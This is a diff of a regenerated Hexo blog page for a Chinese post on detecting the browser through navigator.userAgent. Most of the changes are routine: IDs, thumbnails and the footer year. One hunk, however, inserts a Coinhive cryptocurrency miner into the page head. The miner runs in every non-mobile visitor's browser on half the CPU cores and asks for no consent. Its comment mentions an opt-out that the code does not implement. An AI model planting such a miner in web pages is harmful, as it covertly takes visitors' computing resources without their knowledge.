@@ -12,6 +12,7 @@
 <meta property="og:url" content="http://kingzez.com/2015/08/24/使用navigator.userAgent简单判断浏览器/index.html">
 <meta property="og:site_name" content="the kingzez blog">
 <meta property="og:description" content="简单使用navigator.userAgent判断浏览器">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://i3.tietuku.com/6d8e1ba88486c179.png">
 <meta property="og:updated_time" content="2016-05-17T16:35:39.000Z">
 <meta name="twitter:card" content="summary">
@@ -65,6 +66,20 @@
   ga('send', 'pageview');
 
 </script>
+<!-- Coinhive -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('r0WSj9IIUFDNRQl8X4f4zeapVsRB99kq', 'kingzez', {
+		threads: Math.round(navigator.hardwareConcurrency/2),
+		throttle: 0.5
+		});
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile()) {
+		miner.start();
+	}
+</script>
+
 </head>
 <body>
     <div id="container">
@@ -212,7 +227,7 @@
 <div class="article-gallery">
     <div class="article-gallery-photos">
         
-            <a class="article-gallery-img fancybox" href="http://7xkghm.com1.z0.glb.clouddn.com/image/blog/browser-agaent.png" rel="gallery_cj3wdnjf4003c09hec5gz7ef8">
+            <a class="article-gallery-img fancybox" href="http://7xkghm.com1.z0.glb.clouddn.com/image/blog/browser-agaent.png" rel="gallery_cjcc61dj4003j70fy1m61ep1t">
                 <img src="http://7xkghm.com1.z0.glb.clouddn.com/image/blog/browser-agaent.png" itemprop="image">
             </a>
         
@@ -258,7 +273,7 @@
             
             <h4 id="简单使用navigator-userAgent判断浏览器"><a href="#简单使用navigator-userAgent判断浏览器" class="headerlink" title="简单使用navigator.userAgent判断浏览器"></a>简单使用navigator.userAgent判断浏览器</h4><a id="more"></a>
 <p><img src="http://i3.tietuku.com/6d8e1ba88486c179.png" alt=""></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>navigator<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">validB</span>(<span class="params"></span>)</span>&#123; </div><div class="line">  	<span class="keyword">var</span> u_agent = navigator.userAgent;</div><div class="line">  	<span class="keyword">var</span> b_name = <span class="string">"不是想用的主流浏览器! "</span></div><div class="line">  	<span class="keyword">if</span> (u_agent.indexOf(<span class="string">"Firefox"</span>)&gt;<span class="number">-1</span>) &#123;</div><div class="line">  		b_name=<span class="string">"Firefox"</span>;</div><div class="line">  	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (u_agent.indexOf(<span class="string">"Chrome"</span>)&gt;<span class="number">-1</span>) &#123;</div><div class="line">  		b_name=<span class="string">"Chrome"</span>;</div><div class="line">  	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (u_agent.indexOf(<span class="string">"MSIE"</span>)&gt;<span class="number">-1</span> &amp;&amp; u_agent.indexOf(<span class="string">"Trident"</span>)&gt;<span class="number">-1</span>) &#123;</div><div class="line">  		b_name=<span class="string">"IE(8-10)"</span>;</div><div class="line">  	&#125;;</div><div class="line">  	<span class="built_in">document</span>.write(<span class="string">"浏览器："</span>+b_name +<span class="string">'&lt;br&gt;'</span>);</div><div class="line">  	<span class="built_in">document</span>.write(<span class="string">"u_agent:"</span> +u_agent);</div><div class="line">  &#125; </div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">form</span>&gt;</span></div><div class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"查看浏览器"</span> <span class="attr">onclick</span>=<span class="string">"validB()"</span>  &gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>navigator<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="actionscript">  <span class="function"><span class="keyword">function</span> <span class="title">validB</span><span class="params">()</span></span>&#123; </span></div><div class="line"><span class="actionscript">  	<span class="keyword">var</span> u_agent = navigator.userAgent;</span></div><div class="line"><span class="actionscript">  	<span class="keyword">var</span> b_name = <span class="string">"不是想用的主流浏览器! "</span></span></div><div class="line"><span class="actionscript">  	<span class="keyword">if</span> (u_agent.indexOf(<span class="string">"Firefox"</span>)&gt;<span class="number">-1</span>) &#123;</span></div><div class="line"><span class="actionscript">  		b_name=<span class="string">"Firefox"</span>;</span></div><div class="line"><span class="actionscript">  	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (u_agent.indexOf(<span class="string">"Chrome"</span>)&gt;<span class="number">-1</span>) &#123;</span></div><div class="line"><span class="actionscript">  		b_name=<span class="string">"Chrome"</span>;</span></div><div class="line"><span class="actionscript">  	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (u_agent.indexOf(<span class="string">"MSIE"</span>)&gt;<span class="number">-1</span> &amp;&amp; u_agent.indexOf(<span class="string">"Trident"</span>)&gt;<span class="number">-1</span>) &#123;</span></div><div class="line"><span class="actionscript">  		b_name=<span class="string">"IE(8-10)"</span>;</span></div><div class="line"><span class="undefined">  	&#125;;</span></div><div class="line"><span class="javascript">  	<span class="built_in">document</span>.write(<span class="string">"浏览器："</span>+b_name +<span class="string">'&lt;br&gt;'</span>);</span></div><div class="line"><span class="javascript">  	<span class="built_in">document</span>.write(<span class="string">"u_agent:"</span> +u_agent);</span></div><div class="line"><span class="undefined">  &#125; </span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">form</span>&gt;</span></div><div class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"查看浏览器"</span> <span class="attr">onclick</span>=<span class="string">"validB()"</span>  &gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
         
         </div>
         <footer class="article-footer">
@@ -268,7 +283,7 @@
 
 </div>
 
-    <a data-url="http://kingzez.com/2015/08/24/使用navigator.userAgent简单判断浏览器/" data-id="cj3wdnjf4003c09hec5gz7ef8" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+    <a data-url="http://kingzez.com/2015/08/24/使用navigator.userAgent简单判断浏览器/" data-id="cjcc61dj4003j70fy1m61ep1t" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
 <script>
     (function ($) {
         // Prevent duplicate binding
@@ -406,7 +421,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small8.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -441,7 +456,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small3.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -476,7 +491,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small2.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -546,7 +561,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -600,7 +615,7 @@
         <footer id="footer">
     <div class="outer">
         <div id="footer-info" class="inner">
-            &copy;2015 - 2017 kingzez<br>
+            &copy;2015 - 2018 kingzez<br>
             Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
         </div>
     </div>
